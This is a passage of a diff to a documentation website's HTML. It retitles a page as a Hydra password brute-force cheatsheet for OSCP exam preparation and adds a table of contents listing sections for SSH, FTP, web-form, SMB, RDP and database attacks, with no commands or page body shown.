@@ -20,7 +20,7 @@
     
     
       
-        <title>Hydra Usage - OSCP Prep Mastery</title>
+        <title>Hydra Cheatsheet for OSCP - Hack Mastery</title>
       
     
     
@@ -72,7 +72,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#hydra-usage" class="md-skip">
+        <a href="#hydra-cheatsheet-for-oscp" class="md-skip">
           Skip to content
         </a>
       
@@ -88,7 +88,7 @@
 
 <header class="md-header md-header--shadow" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="../.." title="OSCP Prep Mastery" class="md-header__button md-logo" aria-label="OSCP Prep Mastery" data-md-component="logo">
+    <a href="../.." title="Hack Mastery" class="md-header__button md-logo" aria-label="Hack Mastery" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -102,13 +102,13 @@
       <div class="md-header__ellipsis">
         <div class="md-header__topic">
           <span class="md-ellipsis">
-            OSCP Prep Mastery
+            Hack Mastery
           </span>
         </div>
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Hydra Usage
+              Hydra Cheatsheet for OSCP
             
           </span>
         </div>
@@ -212,13 +212,13 @@
 
 <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../.." title="OSCP Prep Mastery" class="md-nav__button md-logo" aria-label="OSCP Prep Mastery" data-md-component="logo">
+    <a href="../.." title="Hack Mastery" class="md-nav__button md-logo" aria-label="Hack Mastery" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
 
     </a>
-    OSCP Prep Mastery
+    Hack Mastery
   </label>
   
   <ul class="md-nav__list" data-md-scrollfix>
@@ -1421,7 +1421,7 @@
   
   
   <span class="md-ellipsis">
-    Hydra Usage
+    Hydra Cheatsheet for OSCP
     
   </span>
   
@@ -1434,7 +1434,7 @@
   
   
   <span class="md-ellipsis">
-    Hydra Usage
+    Hydra Cheatsheet for OSCP
     
   </span>
   
@@ -1457,11 +1457,767 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#ftp" class="md-nav__link">
+  <a href="#overview" class="md-nav__link">
     <span class="md-ellipsis">
-      FTP
+      Overview
     </span>
   </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#basic-syntax" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic Syntax
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#common-wordlists" class="md-nav__link">
+    <span class="md-ellipsis">
+      Common Wordlists
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssh-brute-force" class="md-nav__link">
+    <span class="md-ellipsis">
+      SSH Brute Force
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SSH Brute Force">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-ssh-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic SSH Attack
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#advanced-ssh-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      Advanced SSH Options
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ftp-brute-force" class="md-nav__link">
+    <span class="md-ellipsis">
+      FTP Brute Force
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="FTP Brute Force">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-ftp-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic FTP Attack
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ftp-custom-port" class="md-nav__link">
+    <span class="md-ellipsis">
+      FTP Custom Port
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-post-form-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP POST Form Attacks
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="HTTP POST Form Attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-post-form" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic POST Form
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#common-post-form-examples" class="md-nav__link">
+    <span class="md-ellipsis">
+      Common POST Form Examples
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#post-form-with-success-string" class="md-nav__link">
+    <span class="md-ellipsis">
+      POST Form with Success String
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#post-form-with-custom-headers" class="md-nav__link">
+    <span class="md-ellipsis">
+      POST Form with Custom Headers
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#post-form-with-cookies" class="md-nav__link">
+    <span class="md-ellipsis">
+      POST Form with Cookies
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#post-form-with-csrf-token" class="md-nav__link">
+    <span class="md-ellipsis">
+      POST Form with CSRF Token
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#complex-post-form-examples" class="md-nav__link">
+    <span class="md-ellipsis">
+      Complex POST Form Examples
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-get-form-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP GET Form Attacks
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="HTTP GET Form Attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-get-form" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic GET Form
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#get-with-custom-headers" class="md-nav__link">
+    <span class="md-ellipsis">
+      GET with Custom Headers
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-basic-auth" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP Basic Auth
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="HTTP Basic Auth">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-authentication" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic Authentication
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#https-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTPS Attacks
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="HTTPS Attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#https-post-form" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTPS POST Form
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#smb-brute-force" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB Brute Force
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SMB Brute Force">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-smb-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic SMB Attack
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rdp-brute-force" class="md-nav__link">
+    <span class="md-ellipsis">
+      RDP Brute Force
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="RDP Brute Force">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-rdp-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic RDP Attack
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mysqlpostgresqlmssql" class="md-nav__link">
+    <span class="md-ellipsis">
+      MySQL/PostgreSQL/MSSQL
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="MySQL/PostgreSQL/MSSQL">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#mysql" class="md-nav__link">
+    <span class="md-ellipsis">
+      MySQL
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#postgresql" class="md-nav__link">
+    <span class="md-ellipsis">
+      PostgreSQL
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mssql" class="md-nav__link">
+    <span class="md-ellipsis">
+      MSSQL
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vnc-brute-force" class="md-nav__link">
+    <span class="md-ellipsis">
+      VNC Brute Force
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#telnet-brute-force" class="md-nav__link">
+    <span class="md-ellipsis">
+      Telnet Brute Force
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pop3imapsmtp" class="md-nav__link">
+    <span class="md-ellipsis">
+      POP3/IMAP/SMTP
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="POP3/IMAP/SMTP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#pop3" class="md-nav__link">
+    <span class="md-ellipsis">
+      POP3
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#imap" class="md-nav__link">
+    <span class="md-ellipsis">
+      IMAP
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smtp" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMTP
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oscp-exam-workflow" class="md-nav__link">
+    <span class="md-ellipsis">
+      OSCP Exam Workflow
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="OSCP Exam Workflow">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#phase-1-reconnaissance-2-5-min" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 1: Reconnaissance (2-5 min)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-2-capture-request-5-10-min" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 2: Capture Request (5-10 min)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-3-build-hydra-command-5-min" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 3: Build Hydra Command (5 min)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-4-execute-attack-variable" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 4: Execute Attack (Variable)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-attack-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      Web Attack Techniques
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Web Attack Techniques">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#finding-the-correct-failure-string" class="md-nav__link">
+    <span class="md-ellipsis">
+      Finding the Correct Failure String
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dealing-with-dynamic-content" class="md-nav__link">
+    <span class="md-ellipsis">
+      Dealing with Dynamic Content
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#handling-redirects" class="md-nav__link">
+    <span class="md-ellipsis">
+      Handling Redirects
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#multiple-parameter-formats" class="md-nav__link">
+    <span class="md-ellipsis">
+      Multiple Parameter Formats
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#advanced-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      Advanced Techniques
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Advanced Techniques">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-proxy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Proxy
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rate-limiting-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      Rate Limiting Bypass
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#resume-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Resume Attack
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#custom-usernamepassword-combinations" class="md-nav__link">
+    <span class="md-ellipsis">
+      Custom Username/Password Combinations
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#testing-single-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      Testing Single Credentials
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#common-oscp-scenarios" class="md-nav__link">
+    <span class="md-ellipsis">
+      Common OSCP Scenarios
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Common OSCP Scenarios">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#scenario-1-basic-web-login" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scenario 1: Basic Web Login
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scenario-2-ssh-with-custom-port" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scenario 2: SSH with Custom Port
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scenario-3-wordpress-login" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scenario 3: WordPress Login
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scenario-4-smb-with-domain" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scenario 4: SMB with Domain
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#troubleshooting" class="md-nav__link">
+    <span class="md-ellipsis">
+      Troubleshooting
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Troubleshooting">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#common-issues" class="md-nav__link">
+    <span class="md-ellipsis">
+      Common Issues
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#debugging-tips" class="md-nav__link">
+    <span class="md-ellipsis">
+      Debugging Tips
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#performance-optimization" class="md-nav__link">
+    <span class="md-ellipsis">
+      Performance Optimization
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Performance Optimization">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#speed-vs-stealth" class="md-nav__link">
+    <span class="md-ellipsis">
+      Speed vs Stealth
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#wordlist-strategy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Wordlist Strategy
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#quick-reference" class="md-nav__link">
+    <span class="md-ellipsis">
+      Quick Reference
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Quick Reference">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#essential-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      Essential Commands
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#common-flags" class="md-nav__link">
+    <span class="md-ellipsis">
+      Common Flags
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pro-tips" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pro Tips
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#resources" class="md-nav__link">
+    <span class="md-ellipsis">
+      Resources
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      Summary
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Summary">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#most-common-oscp-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      Most Common OSCP Commands
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#remember" class="md-nav__link">
+    <span class="md-ellipsis">
+      Remember
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -2837,11 +3593,767 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#ftp" class="md-nav__link">
+  <a href="#overview" class="md-nav__link">
     <span class="md-ellipsis">
-      FTP
+      Overview
     </span>
   </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#basic-syntax" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic Syntax
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#common-wordlists" class="md-nav__link">
+    <span class="md-ellipsis">
+      Common Wordlists
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssh-brute-force" class="md-nav__link">
+    <span class="md-ellipsis">
+      SSH Brute Force
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SSH Brute Force">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-ssh-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic SSH Attack
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#advanced-ssh-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      Advanced SSH Options
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ftp-brute-force" class="md-nav__link">
+    <span class="md-ellipsis">
+      FTP Brute Force
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="FTP Brute Force">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-ftp-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic FTP Attack
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ftp-custom-port" class="md-nav__link">
+    <span class="md-ellipsis">
+      FTP Custom Port
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-post-form-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP POST Form Attacks
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="HTTP POST Form Attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-post-form" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic POST Form
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#common-post-form-examples" class="md-nav__link">
+    <span class="md-ellipsis">
+      Common POST Form Examples
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#post-form-with-success-string" class="md-nav__link">
+    <span class="md-ellipsis">
+      POST Form with Success String
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#post-form-with-custom-headers" class="md-nav__link">
+    <span class="md-ellipsis">
+      POST Form with Custom Headers
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#post-form-with-cookies" class="md-nav__link">
+    <span class="md-ellipsis">
+      POST Form with Cookies
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#post-form-with-csrf-token" class="md-nav__link">
+    <span class="md-ellipsis">
+      POST Form with CSRF Token
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#complex-post-form-examples" class="md-nav__link">
+    <span class="md-ellipsis">
+      Complex POST Form Examples
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-get-form-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP GET Form Attacks
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="HTTP GET Form Attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-get-form" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic GET Form
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#get-with-custom-headers" class="md-nav__link">
+    <span class="md-ellipsis">
+      GET with Custom Headers
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#http-basic-auth" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP Basic Auth
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="HTTP Basic Auth">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-authentication" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic Authentication
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#https-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTPS Attacks
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="HTTPS Attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#https-post-form" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTPS POST Form
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#smb-brute-force" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMB Brute Force
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SMB Brute Force">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-smb-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic SMB Attack
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rdp-brute-force" class="md-nav__link">
+    <span class="md-ellipsis">
+      RDP Brute Force
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="RDP Brute Force">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-rdp-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic RDP Attack
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mysqlpostgresqlmssql" class="md-nav__link">
+    <span class="md-ellipsis">
+      MySQL/PostgreSQL/MSSQL
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="MySQL/PostgreSQL/MSSQL">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#mysql" class="md-nav__link">
+    <span class="md-ellipsis">
+      MySQL
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#postgresql" class="md-nav__link">
+    <span class="md-ellipsis">
+      PostgreSQL
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mssql" class="md-nav__link">
+    <span class="md-ellipsis">
+      MSSQL
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vnc-brute-force" class="md-nav__link">
+    <span class="md-ellipsis">
+      VNC Brute Force
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#telnet-brute-force" class="md-nav__link">
+    <span class="md-ellipsis">
+      Telnet Brute Force
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pop3imapsmtp" class="md-nav__link">
+    <span class="md-ellipsis">
+      POP3/IMAP/SMTP
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="POP3/IMAP/SMTP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#pop3" class="md-nav__link">
+    <span class="md-ellipsis">
+      POP3
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#imap" class="md-nav__link">
+    <span class="md-ellipsis">
+      IMAP
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smtp" class="md-nav__link">
+    <span class="md-ellipsis">
+      SMTP
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oscp-exam-workflow" class="md-nav__link">
+    <span class="md-ellipsis">
+      OSCP Exam Workflow
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="OSCP Exam Workflow">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#phase-1-reconnaissance-2-5-min" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 1: Reconnaissance (2-5 min)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-2-capture-request-5-10-min" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 2: Capture Request (5-10 min)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-3-build-hydra-command-5-min" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 3: Build Hydra Command (5 min)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-4-execute-attack-variable" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 4: Execute Attack (Variable)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-attack-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      Web Attack Techniques
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Web Attack Techniques">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#finding-the-correct-failure-string" class="md-nav__link">
+    <span class="md-ellipsis">
+      Finding the Correct Failure String
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dealing-with-dynamic-content" class="md-nav__link">
+    <span class="md-ellipsis">
+      Dealing with Dynamic Content
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#handling-redirects" class="md-nav__link">
+    <span class="md-ellipsis">
+      Handling Redirects
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#multiple-parameter-formats" class="md-nav__link">
+    <span class="md-ellipsis">
+      Multiple Parameter Formats
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#advanced-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      Advanced Techniques
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Advanced Techniques">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-proxy" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Proxy
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rate-limiting-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      Rate Limiting Bypass
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#resume-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Resume Attack
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#custom-usernamepassword-combinations" class="md-nav__link">
+    <span class="md-ellipsis">
+      Custom Username/Password Combinations
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#testing-single-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      Testing Single Credentials
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#common-oscp-scenarios" class="md-nav__link">
+    <span class="md-ellipsis">
